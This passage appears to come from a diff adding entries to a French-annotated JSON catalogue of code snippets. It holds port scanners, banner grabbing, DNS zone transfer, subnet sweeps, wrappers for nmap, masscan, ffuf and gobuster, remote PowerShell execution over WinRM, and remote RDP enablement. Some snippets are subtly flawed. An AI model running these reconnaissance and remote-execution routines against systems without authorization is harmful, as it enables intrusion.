+      "source": "public static List<int> UnsafePortScanner(string target, int[] ports = null, int timeoutMs = 500) { var open = new List<int>(); ports ??= new int[]{1,1024}; using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp)) { socket.Blocking = false; foreach (int port in ports) { var ep = new IPEndPoint(IPAddress.Parse(target), port); try { socket.Connect(ep); } catch (SocketException ex) { if (ex.SocketErrorCode == SocketError.WouldBlock) { if (socket.Poll(timeoutMs * 1000, SelectMode.SelectWrite)) open.Add(port); } } } } return open; }",
+      "tags": ["portscan","security","rawsocket"],
+      "throws": ["SocketException"]
+    },
+    {
+      "id": "cs_0101",
+      "type": "function",
+      "name": "BannerGrabber",
+      "language": "CSharp",
+      "famille": "CSharp-Net",
+      "description": "Récupère la bannière d'un service TCP (HTTP, SMTP, FTP, SSH, etc.)",
+      "parameters": [
+        { "name": "host", "datatype": "string", "required": true, "description": "Hôte cible" },
+        { "name": "port", "datatype": "int", "required": true, "description": "Port cible" },
+        { "name": "sendString", "datatype": "string", "required": false, "default": "\"\\n\"", "description": "Chaîne à envoyer" },
+        { "name": "timeoutMs", "datatype": "int", "required": false, "default": "5000", "description": "Timeout MS" }
+      ],
+      "returns": { "datatype": "string", "description": "Bannière reçue" },
+      "source": "public static async Task<string> BannerGrabber(string host, int port, string sendString = \"\\n\", int timeoutMs = 5000) { using var client = new TcpClient(); await client.ConnectAsync(host, port); await using var stream = client.GetStream(); var sendData = Encoding.ASCII.GetBytes(sendString); await stream.WriteAsync(sendData, 0, sendData.Length); await stream.FlushAsync(); var buffer = new byte[4096]; var ms = new MemoryStream(); var cts = new CancellationTokenSource(timeoutMs); while (true) { int read = await stream.ReadAsync(buffer.AsMemory(0, buffer.Length), cts.Token); if (read == 0) break; ms.Write(buffer, 0, read); if (read < buffer.Length) break; } return Encoding.ASCII.GetString(ms.ToArray()); }",
+      "tags": ["banner","fingerprint","network"],
+      "throws": ["IOException","SocketException"]
+    },
+    {
+      "id": "cs_0102",
+      "type": "function",
+      "name": "DnsZoneTransfer",
+      "language": "CSharp",
+      "famille": "CSharp-Net",
+      "description": "Tente un transfert de zone AXFR sur un serveur DNS (red team / audit).",
+      "parameters": [
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine cible" },
+        { "name": "dnsServer", "datatype": "string", "required": false, "default": "null", "description": "Serveur DNS (null = résolution depuis NS)" }
+      ],
+      "returns": { "datatype": "List<string>", "description": "Enregistrements DNS" },
+      "source": "public static List<string> DnsZoneTransfer(string domain, string dnsServer = null) { var result = new List<string>(); var servers = dnsServer != null ? new[] { dnsServer } : Dns.GetHostEntry(domain).AddressList.Select(a => a.ToString()).ToArray(); foreach (var ns in servers) { try { var zone = new ZoneTransfer(); var resp = zone.Transfer(domain, ns); if (resp != null) { foreach (var record in resp) result.Add(record.ToString()); } } catch { } } return result; }",
+      "tags": ["dns","axfr","zone","security"],
+      "throws": []
+    },
+    {
+      "id": "cs_0103",
+      "type": "function",
+      "name": "SubnetPingSweep",
+      "language": "CSharp",
+      "famille": "CSharp-Net",
+      "description": "Ping sweep parallèle sur un /24 ou plage CIDR. Retourne les hôtes actifs.",
+      "parameters": [
+        { "name": "subnet", "datatype": "string", "required": true, "description": "CIDR (ex: 192.168.1.0/24)" },
+        { "name": "timeoutMs", "datatype": "int", "required": false, "default": "500", "description": "Timeout MS" }
+      ],
+      "returns": { "datatype": "List<string>", "description": "IPs répondant au ping" },
+      "source": "public static List<string> SubnetPingSweep(string subnet, int timeoutMs = 500) { var (network, mask) = ParseCIDR(subnet); var hosts = new List<string>(); Parallel.For(1, 255, i => { var ip = network + \".\" + i; using var ping = new Ping(); try { var reply = ping.Send(ip, timeoutMs); if (reply.Status == IPStatus.Success) lock(hosts) hosts.Add(ip); } catch { } }); return hosts; } private static (string,int) ParseCIDR(string cidr) { var parts = cidr.Split('/'); return (parts[0], int.Parse(parts[1])); }",
+      "tags": ["ping","network","discovery"],
+      "throws": []
+    },
+    {
+      "id": "cs_0104",
+      "type": "function",
+      "name": "GetPublicIP",
+      "language": "CSharp",
+      "famille": "CSharp-Net",
+      "description": "Récupère l'IP publique via plusieurs services (fallback).",
+      "parameters": [],
+      "returns": { "datatype": "string", "description": "Adresse IPv4 publique" },
+      "source": "public static async Task<string> GetPublicIP() { var services = new[] { \"https://api.ipify.org\", \"https://icanhazip.com\", \"https://checkip.amazonaws.com\" }; foreach (var url in services) { try { using var client = new HttpClient(); return (await client.GetStringAsync(url)).Trim(); } catch { } } return null; }",
+      "tags": ["ip","public","network"],
+      "throws": []
+    },
+    {
+      "id": "py_0100",
+      "type": "function",
+      "name": "shodan_host_scan",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Interroge Shodan pour un hôte (OSINT complet).",
+      "parameters": [
+        { "name": "ip", "datatype": "string", "required": true, "description": "IP cible" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "ShodanAPIKey", "description": "Clé Shodan" }
+      ],
+      "returns": { "datatype": "dict", "description": "Données Shodan" },
+      "source": "def shodan_host_scan(ip, api_key=None): import shodan; api = shodan.Shodan(api_key or os.getenv('SHODAN_KEY')); return api.host(ip)",
+      "tags": ["shodan","osint","recon"],
+      "throws": ["shodan.APIError"]
+    },
+    {
+      "id": "py_0101",
+      "type": "function",
+      "name": "virus_total_scan_file",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Soumet un fichier à VirusTotal et attend le résultat.",
+      "parameters": [
+        { "name": "file_path", "datatype": "string", "required": true, "description": "Chemin du fichier" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "VirustotalAPIKey", "description": "Clé VT" }
+      ],
+      "returns": { "datatype": "dict", "description": "Rapport VT" },
+      "source": "def virus_total_scan_file(file_path, api_key=None): import vt; client = vt.Client(api_key or os.getenv('VT_API_KEY')); with open(file_path, 'rb') as f: analysis = client.scan_file(f, wait_for_completion=True); return analysis.to_dict()",
+      "tags": ["virustotal","malware","sandbox"],
+      "throws": ["vt.error.APIError"]
+    },
+    {
+      "id": "py_0102",
+      "type": "function",
+      "name": "abuseipdb_check",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Vérifie si une IP est répertoriée dans AbuseIPDB.",
+      "parameters": [
+        { "name": "ip", "datatype": "string", "required": true, "description": "IP à vérifier" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "AbuseIPDBKey", "description": "Clé AbuseIPDB" },
+        { "name": "days", "datatype": "int", "required": false, "default": "90", "description": "Période" }
+      ],
+      "returns": { "datatype": "dict", "description": "Score abus" },
+      "source": "def abuseipdb_check(ip, api_key=None, days=90): import requests; headers = {'Key': api_key or os.getenv('ABUSEIPDB_KEY'), 'Accept': 'application/json'}; params = {'ipAddress': ip, 'maxAgeInDays': days}; r = requests.get('https://api.abuseipdb.com/api/v2/check', headers=headers, params=params); return r.json()",
+      "tags": ["abuseipdb","blacklist","threatintel"],
+      "throws": ["requests.RequestException"]
+    },
+    {
+      "id": "py_0103",
+      "type": "function",
+      "name": "censys_ip_lookup",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Recherche d'IP dans Censys (certificats, services exposés).",
+      "parameters": [
+        { "name": "ip", "datatype": "string", "required": true, "description": "IP cible" },
+        { "name": "api_id", "datatype": "string", "required": false, "default": "CensysAPIID", "description": "ID Censys" },
+        { "name": "secret", "datatype": "string", "required": false, "default": "CensysSecret", "description": "Secret Censys" }
+      ],
+      "returns": { "datatype": "dict", "description": "Résultats Censys" },
+      "source": "def censys_ip_lookup(ip, api_id=None, secret=None): from censys import hosts; c = hosts.CensysHosts(api_id or os.getenv('CENSYS_ID'), secret or os.getenv('CENSYS_SECRET')); return c.view(ip)",
+      "tags": ["censys","certificates","recon"],
+      "throws": ["censys.base.CensysException"]
+    },
+    {
+      "id": "py_0104",
+      "type": "function",
+      "name": "grey_noise_quick",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Interroge GreyNoise pour savoir si une IP est malveillante ou bruit de fond.",
+      "parameters": [
+        { "name": "ip", "datatype": "string", "required": true, "description": "IP" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "GreyNoiseAPIKey", "description": "Clé GreyNoise" }
+      ],
+      "returns": { "datatype": "dict", "description": "Classification" },
+      "source": "def grey_noise_quick(ip, api_key=None): import requests; headers = {'key': api_key or os.getenv('GREYNOISE_KEY')}; r = requests.get(f'https://api.greynoise.io/v3/community/{ip}', headers=headers); return r.json()",
+      "tags": ["greynoise","threatintel","noise"],
+      "throws": ["requests.RequestException"]
+    },
+    {
+      "id": "py_0105",
+      "type": "function",
+      "name": "security_trails_dns",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Récupère l'historique DNS et sous-domaines via SecurityTrails.",
+      "parameters": [
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "SecurityTrailsAPIKey", "description": "Clé" }
+      ],
+      "returns": { "datatype": "dict", "description": "Sous-domaines" },
+      "source": "def security_trails_dns(domain, api_key=None): import requests; headers = {'APIKEY': api_key or os.getenv('SECURITYTRAILS_KEY')}; r = requests.get(f'https://api.securitytrails.com/v1/domain/{domain}/subdomains', headers=headers); return r.json()",
+      "tags": ["securitytrails","dns","subdomain"],
+      "throws": ["requests.RequestException"]
+    },
+    {
+      "id": "py_0106",
+      "type": "function",
+      "name": "alienvault_otx_pulse",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Récupère les pulses OTX liés à une IP/domaine.",
+      "parameters": [
+        { "name": "indicator", "datatype": "string", "required": true, "description": "IP/domaine/hash" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "AlienVaultOTXKey", "description": "Clé OTX" }
+      ],
+      "returns": { "datatype": "dict", "description": "Pulses" },
+      "source": "def alienvault_otx_pulse(indicator, api_key=None): import requests; headers = {'X-OTX-API-KEY': api_key or os.getenv('OTX_KEY')}; r = requests.get(f'https://otx.alienvault.com/api/v1/indicators/IPv4/{indicator}/general', headers=headers); return r.json()",
+      "tags": ["alienvault","otx","threatintel"],
+      "throws": ["requests.RequestException"]
+    },
+    {
+      "id": "py_0107",
+      "type": "function",
+      "name": "pulsedive_lookup",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Interroge Pulsedive pour un indicateur (IP, domaine, hash).",
+      "parameters": [
+        { "name": "ioc", "datatype": "string", "required": true, "description": "Indicateur" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "PulsediveAPIKey", "description": "Clé" }
+      ],
+      "returns": { "datatype": "dict", "description": "Détails IOC" },
+      "source": "def pulsedive_lookup(ioc, api_key=None): import requests; params = {'q': ioc, 'key': api_key or os.getenv('PULSEDIVE_KEY')}; r = requests.get('https://pulsedive.com/api/info.php', params=params); return r.json()",
+      "tags": ["pulsedive","threatintel","ioc"],
+      "throws": ["requests.RequestException"]
+    },
+    {
+      "id": "py_0108",
+      "type": "function",
+      "name": "threatfox_ioc",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Recherche d'IOC dans ThreatFox (malware C2, etc.).",
+      "parameters": [
+        { "name": "ioc", "datatype": "string", "required": true, "description": "IP/Domain/Hash" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "ThreatFoxAPIKey", "description": "Clé" }
+      ],
+      "returns": { "datatype": "dict", "description": "Résultats" },
+      "source": "def threatfox_ioc(ioc, api_key=None): import requests; data = {'query': 'search_ioc', 'search_term': ioc, 'api_key': api_key or os.getenv('THREATFOX_KEY')}; r = requests.post('https://threatfox.abuse.ch/api/v1/', json=data); return r.json()",
+      "tags": ["threatfox","malware","c2"],
+      "throws": ["requests.RequestException"]
+    },
+    {
+      "id": "py_0109",
+      "type": "function",
+      "name": "misp_search_attributes",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Recherche d'attributs dans MISP (threat sharing).",
+      "parameters": [
+        { "name": "value", "datatype": "string", "required": true, "description": "Valeur recherchée" },
+        { "name": "misp_url", "datatype": "string", "required": false, "default": "MISP_URL", "description": "URL MISP" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "MISP_API_Key", "description": "Clé API" }
+      ],
+      "returns": { "datatype": "list", "description": "Événements MISP" },
+      "source": "def misp_search_attributes(value, misp_url=None, api_key=None): from pymisp import PyMISP; misp = PyMISP(misp_url or os.getenv('MISP_URL'), api_key or os.getenv('MISP_KEY'), ssl=True); result = misp.search(value, return_format='json'); return result",
+      "tags": ["misp","threatintel","sharing"],
+      "throws": ["pymisp.PyMISPError"]
+    },
+    {
+      "id": "py_0110",
+      "type": "function",
+      "name": "opencti_observable",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Interroge OpenCTI pour enrichir un observable.",
+      "parameters": [
+        { "name": "observable", "datatype": "string", "required": true, "description": "Observable (IP, hash, domain)" },
+        { "name": "opencti_url", "datatype": "string", "required": false, "default": "OpenCTI_URL", "description": "URL OpenCTI" },
+        { "name": "token", "datatype": "string", "required": false, "default": "OpenCTI_Token", "description": "Token" }
+      ],
+      "returns": { "datatype": "dict", "description": "Enrichissements" },
+      "source": "def opencti_observable(observable, opencti_url=None, token=None): from pycti import OpenCTIApiClient; client = OpenCTIApiClient(opencti_url or os.getenv('OpenCTI_URL'), token or os.getenv('OPENCTI_TOKEN')); observable = client.stix_cyber_observable.read(observable); return observable",
+      "tags": ["opencti","threatintel","enrichment"],
+      "throws": ["pycti.OpenCTIApiError"]
+    },
+    {
+      "id": "py_0111",
+      "type": "function",
+      "name": "thehive_create_alert",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Crée une alerte dans TheHive (SOAR).",
+      "parameters": [
+        { "name": "title", "datatype": "string", "required": true, "description": "Titre alerte" },
+        { "name": "description", "datatype": "string", "required": true, "description": "Description" },
+        { "name": "thehive_url", "datatype": "string", "required": false, "default": "TheHive_URL", "description": "URL TheHive" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "TheHive_API_Key", "description": "Clé API" }
+      ],
+      "returns": { "datatype": "dict", "description": "Alerte créée" },
+      "source": "def thehive_create_alert(title, description, thehive_url=None, api_key=None): from thehive4py.api import TheHiveApi; api = TheHiveApi(thehive_url or os.getenv('THEHIVE_URL'), api_key or os.getenv('THEHIVE_KEY')); alert = {'title': title, 'description': description, 'type': 'external', 'source': 'CodeForge'}; response = api.create_alert(alert); return response.json()",
+      "tags": ["thehive","soar","alerting"],
+      "throws": ["thehive4py.exceptions.TheHiveException"]
+    },
+    {
+      "id": "py_0112",
+      "type": "function",
+      "name": "cortex_analyze",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Lance une analyse Cortex sur un observable.",
+      "parameters": [
+        { "name": "data", "datatype": "string", "required": true, "description": "Observable" },
+        { "name": "analyzer", "datatype": "string", "required": true, "description": "Nom analyseur (ex: DomainReputation_1_0)" },
+        { "name": "cortex_url", "datatype": "string", "required": false, "default": "Cortex_URL", "description": "URL Cortex" },
+        { "name": "api_key", "datatype": "string", "required": false, "default": "Cortex_API_Key", "description": "Clé API" }
+      ],
+      "returns": { "datatype": "dict", "description": "Résultats analyse" },
+      "source": "def cortex_analyze(data, analyzer, cortex_url=None, api_key=None): from cortex4py.api import Api; api = Api(cortex_url or os.getenv('CORTEX_URL'), token=api_key or os.getenv('CORTEX_KEY')); job = api.analyzers.run_by_name(analyzer, data, None, force=True); return job",
+      "tags": ["cortex","analyzer","thehive"],
+      "throws": ["cortex4py.exceptions.CortexException"]
+    },
+    {
+      "id": "js_0100",
+      "type": "function",
+      "name": "fetchWithTor",
+      "language": "JavaScript",
+      "famille": "JavaScript-Net",
+      "description": "Requête HTTP via proxy Tor pour anonymisation.",
+      "parameters": [
+        { "name": "url", "datatype": "string", "required": true, "description": "URL cible" },
+        { "name": "torProxy", "datatype": "string", "required": false, "default": "socks5://127.0.0.1:9050", "description": "Proxy SOCKS" },
+        { "name": "timeout", "datatype": "int", "required": false, "default": "30000", "description": "Timeout ms" }
+      ],
+      "returns": { "datatype": "Promise<string>", "description": "Contenu HTML" },
+      "source": "async function fetchWithTor(url, torProxy = 'socks5://127.0.0.1:9050', timeout = 30000) { const SocksProxyAgent = require('socks-proxy-agent'); const agent = new SocksProxyAgent(torProxy); const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), timeout); const res = await fetch(url, { agent, signal: controller.signal }); clearTimeout(timeoutId); return res.text(); }",
+      "tags": ["tor","proxy","anonymity"],
+      "throws": ["Error"]
+    },
+    {
+      "id": "js_0101",
+      "type": "function",
+      "name": "webrtcLeakTest",
+      "language": "JavaScript",
+      "famille": "JavaScript-Net",
+      "description": "Détecte les fuites d'IP via WebRTC (STUN).",
+      "parameters": [],
+      "returns": { "datatype": "Promise<Array<string>>", "description": "IPs locales/publiques" },
+      "source": "async function webrtcLeakTest() { return new Promise((resolve) => { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer)); pc.onicecandidate = (e) => { if (!e.candidate) return; const ip = /([0-9]{1,3}\\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)[0]; resolve([ip]); pc.close(); }; }); }",
+      "tags": ["webrtc","leak","privacy"],
+      "throws": []
+    },
+    {
+      "id": "go_0100",
+      "type": "function",
+      "name": "PortScanGo",
+      "language": "Go",
+      "famille": "Go-System",
+      "description": "Port scanner ultra-rapide en Go (goroutines).",
+      "parameters": [
+        { "name": "host", "datatype": "string", "required": true, "description": "IP" },
+        { "name": "startPort", "datatype": "int", "required": false, "default": "1", "description": "Port début" },
+        { "name": "endPort", "datatype": "int", "required": false, "default": "1024", "description": "Port fin" },
+        { "name": "workers", "datatype": "int", "required": false, "default": "100", "description": "Goroutines" }
+      ],
+      "returns": { "datatype": "[]int", "description": "Ports ouverts" },
+      "source": "func PortScanGo(host string, startPort, endPort, workers int) []int { var wg sync.WaitGroup; var mu sync.Mutex; open := []int{}; ports := make(chan int, workers); for i := 0; i < workers; i++ { go func() { for p := range ports { addr := fmt.Sprintf(\"%s:%d\", host, p); conn, err := net.DialTimeout(\"tcp\", addr, 500*time.Millisecond); if err == nil { conn.Close(); mu.Lock(); open = append(open, p); mu.Unlock(); } } wg.Done(); }() } for p := startPort; p <= endPort; p++ { wg.Add(1); ports <- p } close(ports); wg.Wait(); return open }",
+      "tags": ["portscan","go","concurrent"],
+      "throws": []
+    },
+    {
+      "id": "go_0101",
+      "type": "function",
+      "name": "HTTPHeaderGraber",
+      "language": "Go",
+      "famille": "Go-System",
+      "description": "Récupère les en-têtes HTTP d'un serveur web.",
+      "parameters": [
+        { "name": "url", "datatype": "string", "required": true, "description": "URL" },
+        { "name": "timeout", "datatype": "int", "required": false, "default": "10", "description": "Timeout secondes" }
+      ],
+      "returns": { "datatype": "http.Header", "description": "En-têtes" },
+      "source": "func HTTPHeaderGraber(url string, timeout int) http.Header { client := &http.Client{Timeout: time.Duration(timeout) * time.Second}; resp, err := client.Get(url); if err != nil { return nil }; defer resp.Body.Close(); return resp.Header }",
+      "tags": ["http","headers","fingerprint"],
+      "throws": []
+    },
+    {
+      "id": "sh_0100",
+      "type": "function",
+      "name": "quickRecon",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Reconnaissance rapide (nmap + whois + dig).",
+      "parameters": [
+        { "name": "target", "datatype": "string", "required": true, "description": "Domaine/IP" }
+      ],
+      "returns": { "datatype": "string", "description": "Rapport" },
+      "source": "quickRecon() { TARGET=$1; echo \"=== WHOIS ===\" > /tmp/recon.txt; whois $TARGET >> /tmp/recon.txt; echo \"=== DNS ===\" >> /tmp/recon.txt; dig $TARGET ANY +short >> /tmp/recon.txt; echo \"=== NMAP TOP 1000 ===\" >> /tmp/recon.txt; nmap -T4 -F $TARGET >> /tmp/recon.txt; cat /tmp/recon.txt; }",
+      "tags": ["recon","nmap","bash"],
+      "throws": []
+    },
+    {
+      "id": "sh_0101",
+      "type": "function",
+      "name": "masscanFast",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Masscan ultra-rapide sur tout le réseau local.",
+      "parameters": [
+        { "name": "subnet", "datatype": "string", "required": true, "description": "CIDR" },
+        { "name": "ports", "datatype": "string", "required": false, "default": "0-65535", "description": "Ports" },
+        { "name": "rate", "datatype": "int", "required": false, "default": "1000", "description": "Paquets/s" }
+      ],
+      "returns": { "datatype": "string", "description": "Résultats" },
+      "source": "masscanFast() { sudo masscan $1 -p$2 --rate=$3 -oL /tmp/masscan.txt; cat /tmp/masscan.txt; }",
+      "tags": ["masscan","fastscan","network"],
+      "throws": []
+    },
+    {
+      "id": "sh_0102",
+      "type": "function",
+      "name": "nucleiScan",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Scan de vulnérabilités avec Nuclei.",
+      "parameters": [
+        { "name": "target", "datatype": "string", "required": true, "description": "URL/IP" },
+        { "name": "severity", "datatype": "string", "required": false, "default": "critical,high", "description": "Severities" },
+        { "name": "templates", "datatype": "string", "required": false, "default": "$Nuclei_Templates_Path", "description": "Templates" }
+      ],
+      "returns": { "datatype": "string", "description": "Rapport JSON" },
+      "source": "nucleiScan() { nuclei -u $1 -severity $2 -t $3 -json -o /tmp/nuclei.json; cat /tmp/nuclei.json; }",
+      "tags": ["nuclei","vulnerability","security"],
+      "throws": []
+    },
+    {
+      "id": "sh_0103",
+      "type": "function",
+      "name": "ffufDirBruteforce",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Bruteforce de dossiers/fichiers web.",
+      "parameters": [
+        { "name": "url", "datatype": "string", "required": true, "description": "URL cible" },
+        { "name": "wordlist", "datatype": "string", "required": false, "default": "$FFUF_Wordlist", "description": "Wordlist" },
+        { "name": "extensions", "datatype": "string", "required": false, "default": "$Gobuster_Extensions", "description": "Extensions" },
+        { "name": "threads", "datatype": "int", "required": false, "default": "40", "description": "Threads" }
+      ],
+      "returns": { "datatype": "string", "description": "Résultats" },
+      "source": "ffufDirBruteforce() { ffuf -u $1/FUZZ -w $2 -e $3 -t $4 -o /tmp/ffuf.json; cat /tmp/ffuf.json; }",
+      "tags": ["ffuf","directory","bruteforce"],
+      "throws": []
+    },
+    {
+      "id": "sh_0104",
+      "type": "function",
+      "name": "subfinderPassive",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Collecte passive de sous-domaines.",
+      "parameters": [
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine" },
+        { "name": "sources", "datatype": "string", "required": false, "default": "$Subfinder_Sources", "description": "Sources" }
+      ],
+      "returns": { "datatype": "string", "description": "Liste sous-domaines" },
+      "source": "subfinderPassive() { subfinder -d $1 -s $2 -o /tmp/subfinder.txt; cat /tmp/subfinder.txt; }",
+      "tags": ["subfinder","subdomain","passive"],
+      "throws": []
+    },
+    {
+      "id": "sh_0105",
+      "type": "function",
+      "name": "katanaCrawl",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Crawler moderne (JavaScript parsing).",
+      "parameters": [
+        { "name": "url", "datatype": "string", "required": true, "description": "URL" },
+        { "name": "depth", "datatype": "int", "required": false, "default": "3", "description": "Profondeur" },
+        { "name": "scope", "datatype": "string", "required": false, "default": "$Katana_Scope", "description": "Fichier scope" }
+      ],
+      "returns": { "datatype": "string", "description": "URLs trouvées" },
+      "source": "katanaCrawl() { katana -u $1 -d $2 -sf $3 -o /tmp/katana.txt; cat /tmp/katana.txt; }",
+      "tags": ["katana","crawler","javascript"],
+      "throws": []
+    },
+    {
+      "id": "sh_0106",
+      "type": "function",
+      "name": "gobusterDns",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Bruteforce DNS (sous-domaines).",
+      "parameters": [
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine" },
+        { "name": "wordlist", "datatype": "string", "required": false, "default": "$Amass_Wordlist", "description": "Wordlist" },
+        { "name": "threads", "datatype": "int", "required": false, "default": "30", "description": "Threads" }
+      ],
+      "returns": { "datatype": "string", "description": "Sous-domaines résolus" },
+      "source": "gobusterDns() { gobuster dns -d $1 -w $2 -t $3 -o /tmp/gobuster.txt; cat /tmp/gobuster.txt; }",
+      "tags": ["gobuster","dns","bruteforce"],
+      "throws": []
+    },
+    {
+      "id": "cs_0200",
+      "type": "function",
+      "name": "ExecuteRemotePS",
+      "language": "CSharp",
+      "famille": "CSharp-System",
+      "description": "Exécute une commande PowerShell sur une machine distante via WinRM.",
+      "parameters": [
+        { "name": "computerName", "datatype": "string", "required": true, "description": "Machine cible" },
+        { "name": "script", "datatype": "string", "required": true, "description": "Script PowerShell" },
+        { "name": "username", "datatype": "string", "required": false, "default": "null", "description": "Utilisateur (null = current)" },
+        { "name": "password", "datatype": "string", "required": false, "default": "null", "description": "Mot de passe" }
+      ],
+      "returns": { "datatype": "string", "description": "Sortie du script" },
+      "source": "public static string ExecuteRemotePS(string computerName, string script, string username = null, string password = null) { var connInfo = username != null ? new PSCredential(username, ConvertToSecureString(password)) : null; using (var runspace = RunspaceFactory.CreateRunspace()) { runspace.Open(); using (var ps = PowerShell.Create()) { ps.Runspace = runspace; ps.AddCommand(\"Invoke-Command\").AddParameter(\"ComputerName\", computerName).AddParameter(\"ScriptBlock\", ScriptBlock.Create(script)); if (connInfo != null) ps.AddParameter(\"Credential\", connInfo); var results = ps.Invoke(); return string.Join(Environment.NewLine, results); } } }",
+      "tags": ["winrm","psexec","remote"],
+      "throws": ["PSRemotingTransportException"]
+    },
+    {
+      "id": "cs_0201",
+      "type": "function",
+      "name": "LdapQuery",
+      "language": "CSharp",
+      "famille": "CSharp-AD",
+      "description": "Requête LDAP avancée avec pagination et extraction d'attributs.",
+      "parameters": [
+        { "name": "ldapFilter", "datatype": "string", "required": true, "description": "Filtre" },
+        { "name": "attributes", "datatype": "string[]", "required": false, "default": "new[]{\"sAMAccountName\",\"displayName\"}", "description": "Attributs" },
+        { "name": "searchBase", "datatype": "string", "required": false, "default": "LDAPBase", "description": "Base DN" },
+        { "name": "pageSize", "datatype": "int", "required": false, "default": "1000", "description": "Taille page" }
+      ],
+      "returns": { "datatype": "List<Dictionary<string,string>>", "description": "Objets trouvés" },
+      "source": "public static List<Dictionary<string, string>> LdapQuery(string ldapFilter, string[] attributes = null, string searchBase = null, int pageSize = 1000) { attributes ??= new[] { \"sAMAccountName\", \"displayName\", \"mail\" }; searchBase ??= \"DC=corp,DC=local\"; var results = new List<Dictionary<string, string>>(); using (var entry = new DirectoryEntry($\"LDAP://{searchBase}\")) using (var searcher = new DirectorySearcher(entry, ldapFilter, attributes)) { searcher.PageSize = pageSize; using (var all = searcher.FindAll()) { foreach (SearchResult sr in all) { var dict = new Dictionary<string, string>(); foreach (var attr in attributes) { dict[attr] = sr.Properties.Contains(attr) && sr.Properties[attr].Count > 0 ? sr.Properties[attr][0].ToString() : \"\"; } results.Add(dict); } } } return results; }",
+      "tags": ["ldap","ad","query"],
+      "throws": ["DirectoryServicesCOMException"]
+    },
+    {
+      "id": "cs_0202",
+      "type": "function",
+      "name": "EnableRDPRegistry",
+      "language": "CSharp",
+      "famille": "CSharp-System",
+      "description": "Active/désactive RDP via registre et pare-feu.",
+      "parameters": [
+        { "name": "enable", "datatype": "bool", "required": true, "description": "Activer/désactiver" },
+        { "name": "computerName", "datatype": "string", "required": false, "default": ".", "description": "Machine" }
+      ],
+      "returns": { "datatype": "bool", "description": "Succès" },
+      "source": "public static bool EnableRDPRegistry(bool enable, string computerName = \".\") { var keyPath = @\"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; using (var key = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computerName)) using (var subKey = key.OpenSubKey(keyPath, true)) { subKey?.SetValue(\"fDenyTSConnections\", enable ? 0 : 1); } var firewallCmd = $\"netsh advfirewall firewall set rule group=\\\"remote desktop\\\" new enable={(enable ? \"Yes\" : \"No\")}\"; Process.Start(new ProcessStartInfo { FileName = \"cmd.exe\", Arguments = $\"/c {firewallCmd}\", UseShellExecute = false, CreateNoWindow = true }).WaitForExit(); return true; }",
+      "tags": ["rdp","registry","firewall"],
+      "throws": ["UnauthorizedAccessException"]
+    },
+    {
+      "id": "cs_0203",
+      "type": "function",
+      "name": "GetWiFiNetworks",
+      "language": "CSharp",
+      "famille": "CSharp-System",
+      "description": "Liste les réseaux WiFi visibles (nécessite Native Wifi API).",
+      "parameters": [],
+      "returns": { "datatype": "List<string>", "description": "SSIDs" },
+      "source": "public static List<string> GetWiFiNetworks() { var ssids = new List<string>(); var client = new WlanClient(); foreach (var wlanIface in client.Interfaces) { wlanIface.Scan(); var networks = wlanIface.GetAvailableNetworkList(0); foreach (var net in networks) { ssids.Add(System.Text.Encoding.ASCII.GetString(net.dot11Ssid.SSID, 0, (int)net.dot11Ssid.SSIDLength)); } } return ssids; }",
+      "tags": ["wifi","wireless","network"],
+      "throws": []
+    },
+    {
+      "id": "cs_0204",
+      "type": "function",
+      "name": "SendWOLMagicPacket",
+      "language": "CSharp",
+      "famille": "CSharp-Net",
+      "description": "Envoie un magic packet Wake-on-LAN pour réveiller un PC.",
+      "parameters": [
+        { "name": "mac", "datatype": "string", "required": true, "description": "Adresse MAC" },
+        { "name": "broadcastIP", "datatype": "string", "required": false, "default": "255.255.255.255", "description": "IP broadcast" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "public static void SendWOLMagicPacket(string mac, string broadcastIP = \"255.255.255.255\") { byte[] macBytes = mac.Split('-', ':').Select(b => Convert.ToByte(b, 16)).ToArray(); byte[] packet = new byte[102]; for (int i = 0; i < 6; i++) packet[i] = 0xFF; for (int i = 0; i < 16; i++) Array.Copy(macBytes, 0, packet, 6 + i * 6, 6); using (var udp = new UdpClient()) { udp.Send(packet, packet.Length, broadcastIP, 9); } }",
